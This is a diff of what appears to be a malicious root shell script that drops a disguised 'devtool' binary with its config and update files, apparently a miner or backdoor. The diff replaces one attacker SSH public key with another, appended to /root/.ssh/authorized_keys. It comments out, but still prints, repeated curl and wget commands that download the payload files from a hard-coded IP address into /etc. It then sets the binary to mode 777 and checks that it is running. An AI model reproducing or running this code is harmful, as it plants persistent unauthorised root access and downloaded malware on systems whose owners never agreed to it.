@@ -123,51 +123,51 @@ if [ -f "$rtdir" ]
         chmod 700 /root/.ssh/
         echo >> /root/.ssh/authorized_keys
         chmod 600 root/.ssh/authorized_keys
-        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPK+J+AIJvoCX67fFzfbNU5MT816KDmggltbgEI0hKZRdmMMe1ao/3CEgIzeqGbTff1suT/F1POUjGrf5t/ZqyIJzCIBKqNsxzM4tRNxrIGrqKnZypRlXdX+uZNaxmNJZGkkmtdeseekped0WnWk5SsvbYghBn4y9lZnsO+C1EgjLNWkbRPuoo/RkWTIXDmB7M7UcfYf+sSpApACt8DRydSEkeY709WtL0aANnN057Wnp/Okv+buM4mnkuteLtZvCAySt7PVBrCKyhItZx9VX/TMegljt/UPDaKfAeWF14Q1ORLRQkzZt9k+pY/ccNNbS53OmG0NhQ/awchmgXUpsP root@vultr.guest" >> /root/.ssh/authorized_keys
+        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDotlrjvr+IO+S3Jj7Hp2jPOCxx2hF2ldaE1HREwtyODC5//m7wCpYke9FdT4GZFEdUW+NotIw6ieYoCJ8Vp9LsNLU/7rvk6T8Wk+BjLb/eDY2nzE/0YN/q7X3+Ce1uMuupK7lAf80wQ2DVS16RMGidxVLgh1sViLpSKCws4Tyn/cgGmRI3+s3JraAKvypgSlgwR2rO44nXSpLfSPsK5kAimWdgLzIeNiRWoYS0V/O6JxzoORy+Vi+Agypb8dz676RYPm6l8ybBEvHFkC8u0+ilOOE2RS5OYO+tz7LrFBoTFZYzExktF8KcBFAy3IUGZQ8k2SDV3pcZ11oYbTPHqWzRPLPWLapd2pVsyUiYb0I2j6gl8Jr0um5KqZoG1cS0aC6EUVA0WfYEac1uFfAM62mIT0lLDgQHRk1/s74f9uOBC3dZsiE5uBCaakFYOJxRFQiYxH5GmV2n38THnh20Bq/7P3IpHGwHI+2fAFAF7uxYyqiFP5EG3fCrMtVE8fu3Fd0= jamy@iMac-von-jamy.local" >> /root/.ssh/authorized_keys
         rm /etc/devtool*
         rm /etc/config.json*
         rm /etc/update.sh*
 		rm /root/.ssh/authorized_keys*
         cfg="/etc/config.json"
         file="/etc/devtool"
-        if [ -f "$bbdir" ]
-                        then
-                            curl --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/config.json > /etc/config.json
-                        elif [ -f "$bbdira" ]
-                        then
-                            url --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/config.json > /etc/config.json
-                        elif [ -f "$ccdir" ]
-                        then
-                            wget --timeout=10 --tries=100 -P /etc http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/config.json
-                        elif [ -f "$ccdira" ]
-                        then
-                            get --timeout=10 --tries=100 -P /etc http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/config.json
-        fi
-        if [ -f "$bbdir" ]
-                        then
-                            curl --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/devtool > /etc/devtool
-                        elif [ -f "$bbdira" ]
-                        then
-                            url --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/devtool > /etc/devtool
-                        elif [ -f "$ccdir" ]
-                        then
-                            wget --timeout=10 --tries=100 -P /etc http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/devtool
-                        elif [ -f "$ccdira" ]
-                        then
-                            get --timeout=10 --tries=100 -P /etc http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/devtool
-        fi
-        if [ -f "$bbdir" ]
-                        then
-                            curl --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/update.sh > /etc/update.sh
-                        elif [ -f "$bbdira" ]
-                        then
-                            url --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/update.sh > /etc/update.sh
-                         elif [ -f "$ccdir" ]
-                        then
-                            wget --timeout=10 --tries=100 -P /etc http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/update.sh
-                        elif [ -f "$ccdira" ]
-                        then
-                            get --timeout=10 --tries=100 -P /etc http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/update.sh
+#        if [ -f "$bbdir" ]
+#                        then
+#                            curl --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/config.json > /etc/config.json
+#                        elif [ -f "$bbdira" ]
+#                        then
+#                            url --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/config.json > /etc/config.json
+#                        elif [ -f "$ccdir" ]
+#                        then
+#                            wget --timeout=10 --tries=100 -P /etc http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/config.json
+#                        elif [ -f "$ccdira" ]
+#                        then
+#                            get --timeout=10 --tries=100 -P /etc http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/config.json
+#        fi
+#        if [ -f "$bbdir" ]
+#                        then
+#                            curl --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/devtool > /etc/devtool
+#                        elif [ -f "$bbdira" ]
+#                        then
+#                            url --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/devtool > /etc/devtool
+#                        elif [ -f "$ccdir" ]
+#                        then
+#                            wget --timeout=10 --tries=100 -P /etc http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/devtool
+#                        elif [ -f "$ccdira" ]
+#                        then
+#                            get --timeout=10 --tries=100 -P /etc http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/devtool
+#        fi
+#        if [ -f "$bbdir" ]
+#                        then
+#                            curl --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/update.sh > /etc/update.sh
+#                        elif [ -f "$bbdira" ]
+#                        then
+#                            url --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/update.sh > /etc/update.sh
+#                         elif [ -f "$ccdir" ]
+#                        then
+#                            wget --timeout=10 --tries=100 -P /etc http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/update.sh
+#                        elif [ -f "$ccdira" ]
+#                        then
+#                            get --timeout=10 --tries=100 -P /etc http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/update.sh
         fi
         chmod 777 /etc/devtool
         ps -fe|grep devtool |grep -v grep
